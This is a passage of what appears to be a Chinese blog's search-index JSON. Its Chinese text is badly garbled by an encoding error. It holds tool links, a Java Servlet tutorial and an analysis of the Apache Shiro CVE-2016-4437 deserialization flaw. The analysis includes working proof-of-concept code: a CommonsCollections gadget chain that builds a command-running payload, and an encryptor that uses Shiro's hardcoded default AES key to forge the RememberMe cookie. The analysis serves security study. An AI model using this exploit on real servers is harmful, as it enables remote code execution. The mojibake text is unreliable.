:2nsu\nxxx\n\nåƒåœ¾æ¸…ç†\nCClearn\nGeek uninstall\nWiseCare365\n\nå®‰å…¨è½¯ä»¶\nç«ç»’å®‰å…¨\n360å®‰å…¨å«å£«\nå¡å·´æ–¯åŸº\n\nç§‘å­¦ä¸Šç½‘å·¥å…·\nClash å¯†ç :eq1n  â€“  å®˜ç½‘åœ°å€\nV2rayN   â€“  å®˜ç½‘åœ°å€\n\n","slug":"ç®€æ˜“å¯¼èˆª2","date":"2021-07-23T08:50:14.000Z","categories_index":"å¯¼èˆª","tags_index":"å¯¼èˆª,èµ„æº,å·¥å…·","author_index":"Akpigs"},{"id":"a7ae0256c9c3ac9cd41df0d3fab9f886","title":"ç®€æ˜“å¯¼èˆªä¹‹å‰ç«¯å¿…å¤‡","content":"\nClick to see more\n\n\n\nCSSé¢œè‰²æ­é…\n\n\n\nhttps://mycolor.space/\n\n\nhttps://webgradients.com/\n\n\nhttps://gradientbuttons.colorion.co/\n\n\nhttps://www.eggradients.com/category/green-gradient\n\n\nhttps://uigradients.com/#SiriusTamed\n\n\nhttps://coolbackgrounds.io/\n\n\nhttps://products.ls.graphics/mesh-gradients/\n\n\n\n\n\n","slug":"ç®€æ˜“å¯¼èˆªä¹‹å‰ç«¯å¿…å¤‡","date":"2022-04-17T12:06:45.000Z","categories_index":"å‰ç«¯","tags_index":"å¯¼èˆª,å‰ç«¯","author_index":"Akpigs"},{"id":"8badacccd885f5f014e6790202a79164","title":"ServletåŸºç¡€","content":"ServletåŸºç¡€æ¦‚å¿µ\n\n\n\n\n\n\n\n\nJava Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª Web æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚\nä½¿ç”¨ Servletï¼Œæ‚¨å¯ä»¥æ”¶é›†æ¥è‡ªç½‘é¡µè¡¨å•çš„ç”¨æˆ·è¾“å…¥ï¼Œå‘ˆç°æ¥è‡ªæ•°æ®åº“æˆ–è€…å…¶ä»–æºçš„è®°å½•ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºç½‘é¡µã€‚\nç‹­ä¹‰çš„Servletæ˜¯æŒ‡Javaè¯­è¨€å®ç°çš„ä¸€ä¸ªæ¥å£ï¼Œå¹¿ä¹‰çš„Servletæ˜¯æŒ‡ä»»ä½•å®ç°äº†è¿™ä¸ªServletæ¥å£çš„ç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œäººä»¬å°†Servletç†è§£ä¸ºåè€…ã€‚\nJava EE æä¾›äº† Servlet APIï¼Œé€šè¿‡ Servletï¼Œæˆ‘ä»¬å¯ä»¥å¤„ç† Web åº”ç”¨ç¨‹åºçš„ HTTP è¯·æ±‚ä»¥åŠå“åº”ï¼Œå…³ç³»å¦‚ä¸‹ï¼š\n\n\nServletçš„å®šä¹‰å®šä¹‰ Servlet åªéœ€è¦ç¼–å†™çš„ç±»ç»§æ‰¿javax.servlet.http.HttpServletç±»å¹¶é‡å†™doGet()æˆ–è€…doPost()ç­‰ä»£è¡¨è¯·æ±‚æ–¹å¼çš„æ–¹æ³•å³å¯ã€‚\nHttpServletå…ˆäº†è§£ä¸€ä¸‹HttpServletç±»ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°è¯¥ç±»ç»§æ‰¿äºGenericServletç±»\n\n\nè€ŒGenericServletç±»å®ç°äº†Servletã€ServletConfigå’ŒSerializableæ¥å£\nHttpServletæŠ½è±¡ç±»ä¸­å«æœ‰doGet/doPost/doDelete/doHead/doPut/doOptions/doTraceç­‰æ–¹æ³•ç”¨äºå¤„ç†å®¢æˆ·ç«¯çš„ä¸åŒè¯·æ±‚æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬åœ¨å®šä¹‰ Servlet æ—¶ï¼Œè¦é‡å†™è¯¥æŠ½è±¡ç±»ä¸­çš„æ–¹æ³•ç”¨äºå¤„ç†è¯·æ±‚ã€‚\nåŸºäºæ³¨è§£æ–¹å¼é…ç½®åœ¨ Servlet 3.0 ä¹‹åå¯ä»¥é‡‡ç”¨æ³¨è§£æ–¹å¼é…ç½® Servletï¼Œåœ¨ä»»æ„ç±»å¯¼å…¥javax.servlet.annotation.WebServlet;\nåœ¨ pom.xml æ–‡ä»¶ä¸­æ·»åŠ  maven ä¾èµ–ï¼š\n&lt;dependency&gt;\n    &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;javax.servlet-api&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;3.1.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\nç¼–å†™ ServletTest.class\npackage com.servlet.study;\n\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;21 10:41\n *&#x2F;\n@WebServlet(urlPatterns &#x3D; &quot;&#x2F;hello&quot;)\npublic class ServletTest extends HttpServlet &#123;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;\n        PrintWriter out &#x3D; resp.getWriter();\n        out.write(&quot;&lt;h1&gt;Hello, dotast!&lt;&#x2F;h1&gt;&quot;);\n        out.flush();\n        out.close();\n    &#125;\n&#125;\n\nè®¿é—®/helloæ¥å£\n\n\nåŸºäºweb.xmlæ–‡ä»¶é…ç½®ç¼–å†™å¥½ ServletTest ç±»\npackage com.servlet.study;\n\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;21 10:41\n *&#x2F;\n\npublic class ServletTest extends HttpServlet &#123;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;\n        PrintWriter out &#x3D; resp.getWriter();\n        out.write(&quot;&lt;h1&gt;Hello, dotast!&lt;&#x2F;h1&gt;&quot;);\n        out.flush();\n        out.close();\n    &#125;\n&#125;\n\nåœ¨ web.xml æ–‡ä»¶ä¸­é…ç½® servlet æ ‡ç­¾\n\n\nå¯åŠ¨åè®¿é—®å®šä¹‰å¥½çš„url-pattern\n\n\nRequestä¸Responseåœ¨å‰é¢æˆ‘ä»¬ç¼–å†™çš„ Servlet ç±»ä¸­ï¼ŒdoGet()æ–¹æ³•ä¼ å…¥äº†HttpServletRequestå¯¹è±¡å’ŒHttpServletResponseå¯¹è±¡\npublic class ServletTest extends HttpServlet &#123;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;\n        PrintWriter out &#x3D; resp.getWriter();\n        out.write(&quot;&lt;h1&gt;Hello, dotast!&lt;&#x2F;h1&gt;&quot;);\n        out.flush();\n        out.close();\n    &#125;\n\nHttpServletRequestå¯¹è±¡ç”¨äºå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå½“å®¢æˆ·ç«¯é€šè¿‡HTTPåè®®è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒHTTP ä¸­çš„æ‰€æœ‰ä¿¡æ¯éƒ½å°è£…åœ¨è¿™ä¸ªå¯¹è±¡ä¸­ï¼Œé€šè¿‡HttpServletRequestå¯¹è±¡å¯ä»¥è·å–åˆ°å®¢æˆ·ç«¯è¯·æ±‚çš„æ‰€æœ‰ä¿¡æ¯ã€‚\nHttpServletResponseå¯¹è±¡ç”¨äºå“åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œé€šè¿‡HttpServletResponseå¯¹è±¡å¯ä»¥å¤„ç†æœåŠ¡å™¨ç«¯å¯¹å®¢æˆ·ç«¯è¯·æ±‚å“åº”ã€‚\nHttpServletRequestå¸¸ç”¨æ–¹æ³•\n\n\næ–¹æ³•\nè¯´æ˜\n\n\n\ngetParameter(String name)\nè·å–è¯·æ±‚ä¸­çš„å‚æ•°ï¼Œè¯¥å‚æ•°æ˜¯ç”±nameæŒ‡å®šçš„\n\n\ngetParameterValues(String name)\nè¿”å›è¯·æ±‚ä¸­çš„å‚æ•°å€¼ï¼Œè¯¥å‚æ•°å€¼æ˜¯ç”±nameæŒ‡å®šçš„\n\n\ngetRealPath(String path)\nè·å–Webèµ„æºç›®å½•\n\n\ngetAttribute(String name)\nè¿”å›nameæŒ‡å®šçš„å±æ€§å€¼\n\n\ngetAttributeNames()\nè¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰å±æ€§çš„åå­—é›†åˆ\n\n\ngetCookies()\nè¿”å›å®¢æˆ·ç«¯å‘é€çš„Cookie\n\n\ngetSession()\nè·å–sessionå›è¯å¯¹è±¡\n\n\ngetInputStream()\nè·å–è¯·æ±‚ä¸»é¢˜çš„è¾“å…¥æµ\n\n\ngetReader()\nè·å–è¯·æ±‚ä¸»ä½“çš„æ•°æ®æµ\n\n\ngetMethod()\nè·å–å‘é€è¯·æ±‚çš„æ–¹å¼ï¼Œå¦‚GETã€POST\n\n\ngetParameterNames()\nè·å–è¯·æ±‚ä¸­æ‰€æœ‰å‚æ•°çš„åç§°\n\n\ngetRemoteAddr()\nè·å–å®¢æˆ·ç«¯çš„IPåœ°å€\n\n\ngetRemoteHost()\nè·å–å®¢æˆ·ç«¯åç§°\n\n\ngetServerPath()\nè·å–è¯·æ±‚çš„æ–‡ä»¶çš„è·¯å¾„\n\n\nHttpServletResponseå¸¸ç”¨æ–¹æ³•\n\n\næ–¹æ³•\nè¯´æ˜\n\n\n\ngetWriter()\nè·å–å“åº”æ‰“å°æµå¯¹è±¡\n\n\ngetOutputStream()\nè·å–å“åº”æµå¯¹è±¡\n\n\naddCookie(Cookie cookie)\nå°†æŒ‡å®šçš„CookieåŠ å…¥åˆ°å½“å‰çš„å“åº”ä¸­\n\n\naddHeader(String name,String value)\nå°†æŒ‡å®šçš„åå­—å’Œå€¼åŠ å…¥åˆ°å“åº”çš„å¤´ä¿¡æ¯ä¸­\n\n\nsendError(int sc)\nä½¿ç”¨æŒ‡å®šçŠ¶æ€ç å‘é€ä¸€ä¸ªé”™è¯¯åˆ°å®¢æˆ·ç«¯\n\n\nsendRedirect(String location)\nå‘é€ä¸€ä¸ªä¸´æ—¶çš„å“åº”åˆ°å®¢æˆ·ç«¯\n\n\nsetDateHeader(String name,long date)\nå°†ç»™å‡ºçš„åå­—å’Œæ—¥æœŸè®¾ç½®å“åº”çš„å¤´éƒ¨\n\n\nsetHeader(String name,String value)\nå°†ç»™å‡ºçš„åå­—å’Œå€¼è®¾ç½®å“åº”çš„å¤´éƒ¨\n\n\nsetStatus(int sc)\nç»™å½“å‰å“åº”è®¾ç½®çŠ¶æ€ç \n\n\nsetContentType(String ContentType)\nè®¾ç½®å“åº”çš„MIMEç±»å‹\n\n\n","slug":"ServletåŸºç¡€","date":"2021-11-21T12:49:47.000Z","categories_index":"JavaåŸºç¡€","tags_index":"JavaåŸºç¡€","author_index":"Akpigs"},{"id":"83f5599915e77d106d96bdbba8cc47db","title":"CVE-2016-4437æ¼æ´åˆ†æ","content":"CVE-2016-4437æ¼æ´åˆ†æå‰è¨€CVE-2016-4437 æ˜¯ Shiro å†å²æ¼æ´ä¸­æ¯”è¾ƒè‘—åçš„ä¸€ä¸ªï¼Œå®˜æ–¹ç¼–å·ä¸º Shiro-550ã€‚\nå½±å“ç‰ˆæœ¬ï¼šShiro  &lt; 1.2.5\næ¼æ´æè¿°ï¼šå¦‚æœç¨‹åºæœªèƒ½æ­£ç¡®é…ç½® â€œremember meâ€ åŠŸèƒ½æ‰€ä½¿ç”¨çš„å¯†é’¥ã€‚æ”»å‡»è€…å¯é€šè¿‡å‘é€å¸¦æœ‰ç‰¹åˆ¶å‚æ•°çš„è¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç æˆ–è®¿é—®å—é™åˆ¶å†…å®¹ã€‚\nå‰ç½®çŸ¥è¯†Shiro åœ¨ 0.9 ç‰ˆæœ¬å¼€å§‹æä¾› RememberMe æ¨¡å—ï¼Œç”¨äºåº”ç”¨ç¨‹åºè®°å½•ç™»å½•ç”¨æˆ·å‡­è¯çš„åŠŸèƒ½ã€‚\nRememberMeManagerorg.apache.shiro.mgt.RememberMeManageræ¥å£æä¾›äº†ä»¥ä¸‹äº”ä¸ªæ–¹æ³•ï¼š\n\ngetRememberedPrincipals()ï¼šRememberMe çš„åŠŸèƒ½ï¼Œåœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾è®°å½•çš„principalsã€‚\nforgetIdentity()ï¼šå¿˜è®°ç”¨æˆ·èº«ä»½æ ‡è¯†ã€‚\nonSuccessfulLogin()ï¼šç™»å½•æ ¡éªŒæˆåŠŸæ—¶è°ƒç”¨ï¼Œä¿å­˜å½“å‰ç”¨æˆ·çš„principalsä»¥ä¾›åº”ç”¨ç¨‹åºä»¥åè°ƒç”¨ã€‚\nonFailedLogin()ï¼šç™»å½•æ ¡éªŒå¤±è´¥æ—¶è°ƒç”¨ï¼Œå¿˜è®°å½“å‰ç”¨æˆ·çš„principalsã€‚\nonLogout()ï¼šç”¨æˆ·é€€å‡ºç™»å½•æ—¶è°ƒç”¨ï¼Œå¿˜è®°å½“å‰ç”¨æˆ·çš„principalsã€‚\n\nAbstractRememberMeManagerorg.apache.shiro.mgt.AbstractRememberMeManageræ˜¯å®ç°RememberMeMangeræ¥å£ç±»çš„æŠ½è±¡ç±»ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„æˆå‘˜å˜é‡éœ€è¦äº†è§£ï¼š\n\n DEFAULT_CIPHER_KEY_BYTESï¼šä¸€ä¸ªç¡¬ç¼–ç  AES KEYï¼Œè¯¥ KEY ä¼šè¢«è®¾ç½®ä¸ºåŠ è§£å¯† KEY çš„æˆå‘˜å˜é‡ï¼ˆencryptionCipherKey&#x2F;decryptionCipherKeyï¼‰ã€‚\nserializerï¼šShiro çš„åºåˆ—åŒ–å™¨ï¼Œç”¨æ¥å¯¹åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ ‡è¯†ç”¨æˆ·èº«ä»½çš„PrincipalCollectionå¯¹è±¡ã€‚\ncipherServiceï¼šç”¨äºæ•°æ®åŠ è§£å¯†çš„ç±»ï¼Œå®é™…ä¸Šæ˜¯org.apache.shiro.crypto.AesCipherServiceç±»ã€‚\n\nCookieRememberMeManagerorg.apache.shiro.web.mgt.CookieRememberMeManagerç±»åœ¨ Shiro ä¸­å®ç°ä½¿ç”¨ Cookie è®°å½•ç”¨æˆ·èº«ä»½ä¿¡æ¯çš„åŠŸèƒ½ï¼Œæ¯”è¾ƒå€¼å¾—å…³æ³¨çš„æ–¹æ³•ä¸ºgetRememberedSerializedIdentity()ï¼š\nprotected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;\n        if (!WebUtils.isHttp(subjectContext)) &#123;\n            if (log.isDebugEnabled()) &#123;\n                String msg &#x3D; &quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;;\n                log.debug(msg);\n            &#125;\n\n            return null;\n        &#125; else &#123;\n            WebSubjectContext wsc &#x3D; (WebSubjectContext)subjectContext;\n            if (this.isIdentityRemoved(wsc)) &#123;\n                return null;\n            &#125; else &#123;\n                HttpServletRequest request &#x3D; WebUtils.getHttpRequest(wsc);\n                HttpServletResponse response &#x3D; WebUtils.getHttpResponse(wsc);\n                String base64 &#x3D; this.getCookie().readValue(request, response);\n                if (&quot;deleteMe&quot;.equals(base64)) &#123;\n                    return null;\n                &#125; else if (base64 !&#x3D; null) &#123;\n                    base64 &#x3D; this.ensurePadding(base64);\n                    if (log.isTraceEnabled()) &#123;\n                        log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;);\n                    &#125;\n\n                    byte[] decoded &#x3D; Base64.decode(base64);\n                    if (log.isTraceEnabled()) &#123;\n                        log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded !&#x3D; null ? decoded.length : 0) + &quot; bytes.&quot;);\n                    &#125;\n\n                    return decoded;\n                &#125; else &#123;\n                    return null;\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n\nåœ¨è¯¥æ–¹æ³•ä¸­ï¼Œä¸»è¦å®ç°äº†è·å– Cookie ä¸­çš„å†…å®¹å¹¶é€šè¿‡ Base64 è§£ç ï¼Œç„¶åè¿”å› byte æ•°ç»„çš„åŠŸèƒ½ã€‚\næ¼æ´åˆ†ææ¼æ´ç¯å¢ƒå·²ç»ä¸Šä¼ åˆ° github ä¸­ï¼šhttps://github.com/dota-st/vulnEnv\nå…ˆç®€å•äº†è§£ä¸€ä¸‹è¯¥æ¼æ´çš„åŸç†ï¼š\nå½“ç”¨æˆ·ç™»å½•å‹¾é€‰remember meçš„æ—¶å€™ï¼ŒShiro ä¼šå°†å½“å‰ç”¨æˆ·çš„ Cookie ä¿¡æ¯åºåˆ—åŒ–åè¿›è¡Œ AES åŠ å¯†å­˜å‚¨åœ¨ Cookie çš„ RememberMe å­—æ®µä¸­ï¼Œåœ¨ä¸‹æ¬¡è¯·æ±‚æ—¶ä¼šè¯»å– Cookie ä¸­çš„ RememberMe å­—æ®µå¹¶è¿›è¡Œ AES è§£å¯†ç„¶åååºåˆ—åŒ–ã€‚\nç„¶è€Œé€šè¿‡å‰é¢çš„AbstractRememberMeManagerç±»æˆ‘ä»¬çŸ¥é“ï¼ŒAES åŠ è§£å¯†çš„ KEY æ˜¯ç¡¬ç¼–ç åœ¨è¯¥ç±»ä¸­çš„ï¼Œå› æ­¤å½“æˆ‘ä»¬çŸ¥é“ KEYä¹‹åï¼Œå¯ä»¥ä¼ªé€  RememberMe å­—æ®µè¿›è€Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚\né‚£ä¹ˆæˆ‘ä»¬ä¾¿å¼€å§‹ä¸€æ­¥æ­¥è·Ÿç€è°ƒè¯•å§ï¼Œæ‰“ä¸Šæ–­ç‚¹ï¼Œåœ¨ Cookie æ·»åŠ  RememberMe å­—æ®µç„¶åå‘é€è¯·æ±‚ã€‚\nåœ¨\t#getRememberedPrincipals()æ–¹æ³•ä¸­å°†ä¸Šä¸‹æ–‡æ•°æ®ä¼ å…¥åˆ°getRememberedSerializedIdentity()æ–¹æ³•ä¸­\næ¥ç€ä¼šè·³è½¬åˆ°CookieRememberMeManager#getRememberedSerializedIdentity()æ–¹æ³•ä¸­\nå¯ä»¥çœ‹åˆ°readValue()æ–¹æ³•ä¼šä»è¯·æ±‚ä¸­è·å–RememberMeå­—æ®µçš„å€¼ï¼Œæœ€åé€šè¿‡Base64.decode()è§£ç åè¿”å› byte æ•°ç»„ï¼Œæ¥ç€åˆå›åˆ°getRememberedPrincipals()æ–¹æ³•\nç»§ç»­è·Ÿè¿›convertBytesToPrincipals()æ–¹æ³•ï¼Œè°ƒç”¨decrypt()æ–¹æ³•è¿›è¡Œè§£å¯†\nç»§ç»­è·Ÿè¿›decrypt()æ–¹æ³•\nè¿™é‡Œè°ƒç”¨åˆ°getDecryptionCipherKey()æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹\nè¿™é‡Œåˆ°äº†AbstractRememberMeManager#getDecryptionCipherKey()æ–¹æ³•ï¼Œå‰é¢æˆ‘ä»¬æåˆ°è¿‡è¯¥ç±»ï¼Œåœ¨è¿™é‡Œè·å–åˆ°äº†ç¡¬ç¼–ç çš„ç§˜é’¥ã€‚\næ¥ç€decrypt()æ–¹æ³•èµ°å®Œ return äº†serializedå­—èŠ‚æ•°ç»„ï¼Œæœ€åè°ƒç”¨äº†deserialize()æ–¹æ³•\nç»§ç»­è·Ÿè¿›deserialize()æ–¹æ³•ï¼Œè·Ÿç€è°ƒç”¨äº†getSerializer().deserialize()æ–¹æ³•\nç»§ç»­è·Ÿè¿›getSerializer().deserialize()æ–¹æ³•\nå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œé€šè¿‡ByteArrayInputStream()è·å–äº†è¾“å…¥æµï¼Œæœ€åè°ƒç”¨readObject()æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚\nå›é¡¾æ¢³ç†ä¸€ä¸‹æµç¨‹ï¼š\n\nä¼ å…¥RememberMeå­—æ®µï¼Œè·å–è¯¥å­—æ®µçš„å€¼ï¼›\nå¯¹RememberMeè¿›è¡Œ Base64 è§£ç ï¼Œç„¶åè°ƒç”¨ç¡¬ç¼–ç çš„ KEY è¿›è¡Œè§£å¯†ï¼›\nå¯¹è§£å¯†åçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚\n\nç¼–å†™ POCåœ¨ pom.xml æ–‡ä»¶é‡Œæ·»åŠ äº†CommonCollectionså’Œjavassistä¾èµ–ï¼Œä»¥å®Œæˆååºåˆ—åŒ–çš„åˆ©ç”¨æ¼”ç¤ºã€‚\nè¿™é‡Œé€šè¿‡å‰é¢æˆ‘ä»¬å­¦ä¹ çš„CommonsCollections11é“¾å­ç”Ÿæˆæ¶æ„æ–‡ä»¶\npackage com.serialize;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;12 15:50\n *&#x2F;\npublic class CommonsCollections11 &#123;\n    public static void main(String[] args) throws Exception&#123;\n        CommonsCollections11 commonsCollections11 &#x3D; new CommonsCollections11();\n        commonsCollections11.serialize();\n    &#125;\n    public void serialize() throws Exception&#123;\n        String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;open -a Calculator.app\\&quot;);&quot;;\n        &#x2F;&#x2F; åˆ›å»ºevailClass\n        ClassPool pool &#x3D; ClassPool.getDefault();\n        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));\n        CtClass evailClass &#x3D; pool.makeClass(&quot;evailClass&quot;);\n        &#x2F;&#x2F; å°†ä»£ç æ’è¿›static&#123;&#125;\n        evailClass.makeClassInitializer().insertBefore(cmd);\n        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        &#x2F;&#x2F; è½¬æ¢æˆå­—èŠ‚ç \n        byte[] classBytes &#x3D; evailClass.toBytecode();\n        byte[][] targetByteCodes &#x3D; new byte[][]&#123;classBytes&#125;;\n        &#x2F;&#x2F; åå°„ä¿®æ”¹\n        TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();\n        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);\n        bytecodes.setAccessible(true);\n        bytecodes.set(templates, targetByteCodes);\n\n        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);\n        name.setAccessible(true);\n        name.set(templates, &quot;name&quot;);\n\n        Field _class &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);\n        _class.setAccessible(true);\n        _class.set(templates, null);\n\n        &#x2F;&#x2F; åˆ›å»ºæ¶æ„çš„è°ƒç”¨é“¾\n        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;toString&quot;,new Class[0], new Object[0]);\n        Map innerMap &#x3D; new HashMap&lt;&gt;();\n        Map outerMap &#x3D; LazyMap.decorate(innerMap, invokerTransformer);\n        &#x2F;&#x2F; åˆ›å»ºTiedMapEntryå®ä¾‹\n        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(outerMap,templates);\n        Map expMap &#x3D; new HashMap&lt;&gt;();\n        expMap.put(tiedMapEntry,&quot;valueTest&quot;);\n        outerMap.remove(templates);\n        &#x2F;&#x2F; é€šè¿‡åå°„ä¿®æ”¹iMethodNameå€¼ä¸ºnewTransformer\n        Field f &#x3D; invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);\n        f.setAccessible(true);\n        f.set(invokerTransformer, &quot;newTransformer&quot;);\n        FileOutputStream fileOutputStream &#x3D; new FileOutputStream(&quot;1.txt&quot;);\n        &#x2F;&#x2F; åˆ›å»ºå¹¶å®ä¾‹åŒ–å¯¹è±¡è¾“å‡ºæµ\n        ObjectOutputStream out &#x3D; new ObjectOutputStream(fileOutputStream);\n        out.writeObject(expMap);\n\n    &#125;\n    \n&#125;\n\næ ¹æ®å¯¹åº”çš„AbstractRememberMeManager#encrypt()æ–¹æ³•ç¼–å†™åŠ å¯†\npackage com.shiro;\n\nimport com.sun.org.apache.xerces.internal.impl.dv.util.Base64;\nimport org.apache.shiro.crypto.AesCipherService;\nimport org.apache.shiro.util.ByteSource;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.FileInputStream;\nimport java.io.InputStream;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;10 10:45\n *&#x2F;\npublic class Shiro550 &#123;\n    public static void main(String[] args) throws Exception &#123;\n        String path &#x3D; &quot;1.txt&quot;;\n        byte[] key &#x3D; Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;);\n        AesCipherService aes &#x3D; new AesCipherService();\n        ByteSource ciphertext &#x3D; aes.encrypt(getBytes(path), key);\n        System.out.printf(ciphertext.toString());\n    &#125;\n\n\n    public static byte[] getBytes(String path) throws Exception&#123;\n        InputStream inputStream &#x3D; new FileInputStream(path);\n        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();\n        int n &#x3D; 0;\n        while ((n&#x3D;inputStream.read())!&#x3D;-1)&#123;\n            byteArrayOutputStream.write(n);\n        &#125;\n        byte[] bytes &#x3D; byteArrayOutputStream.toByteArray();\n        return bytes;\n\n    &#125;\n&#125;\n\nè¿è¡Œåè·å¾—æ„é€ çš„æ¶æ„RememberMeå­—æ®µå†…å®¹ï¼Œæ·»åŠ åˆ° Cookie ä¸­å‘é€è¯·æ±‚ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚\nShiro ä¸ CC6åœ¨Commons-Collections11çš„æ—¶å€™æ›¾æè¿‡Commons-Collections6è¿™æ¡é“¾å­åœ¨ shiro ä¸­ä½¿ç”¨ä¼šæŠ¥é”™ï¼Œä½†å¦‚æœä½ ç”¨Commons-Collections6ç”Ÿæˆçš„ POC åœ¨æˆ‘ä¸Šé¢æ­çš„ç¯å¢ƒä¼šå‘ç°ä¾ç„¶èƒ½æ­£å¸¸å¼¹å‡ºè®¡ç®—å™¨ï¼Œå¹¶æ²¡æœ‰å‡ºç°æŠ¥é”™ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\nåœ¨ä¸Šè¿°ç¯å¢ƒä½¿ç”¨çš„ä¾èµ–æ˜¯shiro-springï¼Œä¹Ÿå°±æ˜¯ç”¨ Spring-boot æ„å»ºçš„ Shiro\n&lt;dependency&gt;\n            &lt;groupId&gt;org.apache.shiro&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;shiro-spring&lt;&#x2F;artifactId&gt;\n            &lt;version&gt;1.2.4&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\nShiro çš„åŸç”Ÿä¾èµ–åªç”¨åˆ°äº†ï¼šshiro-coreå’Œshiro-webï¼Œé‚£ä¹ˆSpringæ„å»ºçš„Shiroå’ŒåŸç”Ÿçš„Shiroæœ‰ä»€ä¹ˆä¸åŒå‘¢ï¼Ÿ\næˆ‘ä»¬ä½¿ç”¨åŸç”Ÿç¯å¢ƒè°ƒè°ƒçœ‹ï¼Œè¿™é‡Œç›´æ¥å» Shiro çš„ä»“åº“ä¸‹è½½ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹ pom.xml æ–‡ä»¶å³å¯ï¼Œä¸‹é¢ç”¨åˆ°çš„ç¯å¢ƒä¹Ÿä¸Šä¼ åˆ°å‰é¢æåˆ°çš„ github ä»“åº“äº†ã€‚è¿è¡Œåè®¿é—®ä¸»é¡µï¼Œä½¿ç”¨CommonCollections6çš„ POC å‘é€è¯·æ±‚\nå¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Œå†å›æ¥çœ‹çœ‹ idea\næŠ¥é”™äº†ï¼Œå…·ä½“é”™è¯¯å¦‚ä¸‹ï¼š\nCaused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system&#x2F;application ClassLoaders.  All heuristics have been exhausted.  Class could not be 